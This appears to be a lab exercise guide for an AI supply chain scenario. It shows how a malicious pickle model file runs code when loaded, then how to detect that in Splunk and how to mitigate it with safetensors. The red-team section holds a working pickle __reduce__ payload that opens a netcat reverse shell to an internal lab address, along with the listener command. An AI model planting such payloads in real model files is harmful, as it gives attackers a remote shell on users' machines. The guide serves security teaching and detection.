# 🚀 Scenario 06 Detailed Guide: AI Supply Chain Attack (Malicious Pickle)

## 📖 1. Background & Theory
**Framework Mapping**: OWASP: LLM03 / ATLAS: AML.T0010

Python's `pickle` module is insecure by design. When loading a model, a malicious `__reduce__` method can execute OS commands. Downloading untrusted models from HuggingFace poses a critical risk.

**Objective**: Demonstrate arbitrary code execution via loading an untrusted serialized Python model (.pkl).

---

## 🛠️ 2. Environment Setup
1. SSH into the GCP lab VM via IAP and ensure Docker is running (`docker ps`).
2. Execute the following command to prepare the target environment:
```bash
docker exec -it kali bash
nc -lvnp 4444
```
3. Ensure Splunk HEC is receiving logs over the VPC-internal network.

---

## 🔴 3. Red Team Walkthrough (Attack)
Follow these exact steps to simulate the attack.

**Command:**
```bash
cat <<EOF > malicious.py
import pickle, os
class Malicious:
    def __reduce__(self): return (os.system, ("nc 10.10.20.10 4444 -e /bin/sh",))
pickle.dump(Malicious(), open("model.pkl", "wb"))
EOF
python3 malicious.py
```

**What is happening?**
We generate a malicious model.pkl. When the victim (Jupyter Lab or ML App) loads this model to make predictions, it will instantly reverse shell back to Kali.

**Expected Output:**
You should see a successful execution or data exfiltration on your attacker terminal. **Take a screenshot and save it to the `evidence/` folder in the scenario directory.**

---

## 🔵 4. Blue Team Walkthrough (Detection)
Now that the attack has occurred, switch to your Splunk Web Interface (GCP IAP Tunnel).

1. Open `Apps -> Search & Reporting`.
2. Set the Time Range to `Last 15 minutes` to filter out noise.
3. Run the following Advanced SPL query:

```spl
index=sysmon EventCode=3 (Image="*python*" OR Image="*jupyter*")
| search DestinationPort="4444" OR DestinationPort="443"
| table _time, host, Image, DestinationIp, DestinationPort
```

**Analysis:**
This query searches the logs and correlates the malicious indicators. Review the results table. **Take a screenshot of the detected attack and save it to the `evidence/` folder.**

---

## 🛡️ 5. Mitigation & Fix
To secure the system against this vulnerability, implement the following:

**Recommendation:**
> Never use Pickle. Migrate all ML models to `safetensors` format which only stores data, not executable code.

*Once you have completed these steps, fill out the `README.md` file in this scenario's directory and push your changes to GitHub!*
